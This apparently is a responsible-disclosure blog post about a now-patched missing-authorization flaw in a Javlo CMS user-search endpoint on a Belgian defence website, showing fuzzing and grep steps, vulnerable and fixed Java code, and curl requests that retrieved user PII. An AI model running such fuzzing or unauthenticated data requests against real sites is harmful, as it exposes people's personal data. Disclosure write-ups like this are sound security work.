---
layout: post
title: "Unauthorized Access to PII via User Search on BDF Website"
date: 2026-01-05
tags: [responsible-disclosure, broken-access-control, cve, javlo-cms]
excerpt: "Discovered a critical broken access control vulnerability in bdf.belgium.be that exposed sensitive user information including emails and phone numbers of military personnel without authentication. The vulnerability was found through source code analysis of the open-source Javlo CMS."
---

---

## Summary

The user search functionality on bdf.belgium.be allowed unauthenticated users to access and retrieve sensitive user information without authentication checks. The AJAX endpoint `/ajax/en?webaction=user-search.ajaxsearch` returned user data including emails, phone numbers, and other personal information to any visitor.

---

## Discovery Process

### Initial Reconnaissance

Started with endpoint fuzzing on bdf.belgium.be:

```bash
ffuf -u https://bdf.belgium.be/FUZZ -w common-endpoints.txt
```

Discovered AJAX endpoint pattern:
```
/ajax/en?webaction=*
```

Initial testing showed limited results. Needed to understand the application architecture.

### Application Identification

Analyzed login page and application behavior:
- JSESSIONID session management
- URL routing patterns
- Response headers

Identified the application as **Javlo CMS** (Java-based Content Management System).

### Source Code Analysis

Searched GitHub for Javlo CMS repository:
```
https://github.com/Javlo/javlo
```

Repository was public and open source. Downloaded source code for analysis.

Searched for user search functionality:
```bash
grep -r "user-search" src/
grep -r "ajaxsearch" src/
```

Found vulnerable file: `src/main/java/org/javlo/component/users/UserSearch.java`

### Code Review

**Vulnerable Method 1: performAjaxsearch() (Line 368-377)**

```java
public synchronized static String performAjaxsearch(RequestService rs, ContentContext ctx, 
    MessageRepository messageRepository, I18nAccess i18nAccess) throws Exception {
    
    String text = rs.getParameter("text", "").trim().toLowerCase();
    String country = rs.getParameter("country", "").trim();
    String domain = rs.getParameter("domain", "").trim();
    
    List<UserInfo> users = UserFactory.getUserInfoList(ctx);
    // returns user data without authentication check
}
```

**Vulnerable Method 2: performSearch() (Line 341-350)**

```java
public static String performSearch(RequestService rs, ContentContext ctx, 
    MessageRepository messageRepository, I18nAccess i18nAccess) throws IOException {
    
    String text = rs.getParameter("text", "").trim();
    
    List<UserInfo> adminUsers = AdminUserFactory.getUserInfoList(ctx);
    // returns admin user data without authentication check
}
```

**Vulnerable View Rendering (Line 154-158)**

```java
List<UserInfo> users = (List<UserInfo>) ctx.getRequest().getAttribute("users");
if (users != null) {
    out.println("<div class=\"result\">");
    // renders user data without permission check
}
```

Both methods called UserFactory and AdminUserFactory directly without authentication validation.

---

## Exploitation

### Request

```http
POST /ajax/en?webaction=user-search.ajaxsearch HTTP/2
Host: bdf.belgium.be
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=838ED679D45773A58DF2D718831C9935
Content-Length: 10

```

### Testing

```bash
# Test without authentication
curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \

# Result: HTTP 200 - Returns user data
```

```bash
# Test with invalid session
curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
  -H 'Cookie: JSESSIONID=INVALID_SESSION' \

# Result: HTTP 200 - Still returns user data
```

### Response Data

```json
{
  "users": [
    {
      "id": "user123",
      "email": "john.doe@defense.belgium.be",
      "firstName": "John",
      "lastName": "Doe",
      "phone": "+32 2 XXX XX XX",
      "organization": "Belgian Defence",
      "role": "officer"
    }
  ]
}
```

---

## Impact

1. Unauthorized access to all user PII
2. Exposure of military personnel contact information
3. GDPR violation - Article 32 (Security of processing)
4. Potential for targeted phishing attacks
5. Social engineering risk using legitimate contact data

**Classification:**
- OWASP Top 10 2021: A01:2021 - Broken Access Control
- CWE-862: Missing Authorization
- CVSS: 7.5 (High)

---

---

## The Fix

Development team implemented authentication checks:

**New Method (Line 45-47):**
```java
private static boolean isAccess(ContentContext ctx) {
    return ctx.getCurrentUser() != null && ctx.getCurrentUser().getRoles().size() > 0;
}
```

**Fixed performAjaxsearch() (Line 381-384):**
```java
public synchronized static String performAjaxsearch(RequestService rs, ContentContext ctx,
    MessageRepository messageRepository, I18nAccess i18nAccess) throws Exception {
    
    if (!isAccess(ctx)) {
        throw new SecurityException("You do not have permission to perform this action.");
    }
    
    String text = rs.getParameter("text", "").trim().toLowerCase();
    // ... rest of code
}
```

**Fixed performSearch() (Line 349-352):**
```java
public static String performSearch(RequestService rs, ContentContext ctx,
    MessageRepository messageRepository, I18nAccess i18nAccess) throws IOException {
    
    if (!isAccess(ctx)) {
        throw new SecurityException("You do not have permission to perform this action.");
    }
    
    String text = rs.getParameter("text", "").trim();
    // ... rest of code
}
```

**Fixed View Rendering (Line 157):**
```java
if (users != null && isAccess(ctx)) {
    out.println("<div class=\"result\">");
    // ... render user data
}
```

---

## Verification

Post-fix testing confirmed the vulnerability was resolved:

```bash
# Unauthenticated request
curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \

# Result: HTTP 403/500 - Access Denied
```

```bash
# Authenticated with valid role
curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
  -H 'Cookie: JSESSIONID=[valid_session_with_role]' \

# Result: HTTP 200 - Access granted (as intended)
```

---

## Timeline

- **January 3, 2026** - Initial fuzzing, discovered AJAX endpoints
- **January 3, 2026** - Identified Javlo CMS, found GitHub repository, completed code review
- **January 4, 2026** - Verified vulnerability, created proof of concept
- **January 4, 2026** - Submitted responsible disclosure report
- **January 5, 2026** - Vendor acknowledged, began fix development
- **January 5, 2026** - Patch deployed
- **January 5, 2026** - Public disclosure

---

## References

- GitHub: [https://github.com/Javlo/javlo](https://github.com/Javlo/javlo)
- OWASP A01:2021: [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- CWE-862: [https://cwe.mitre.org/data/definitions/862.html](https://cwe.mitre.org/data/definitions/862.html)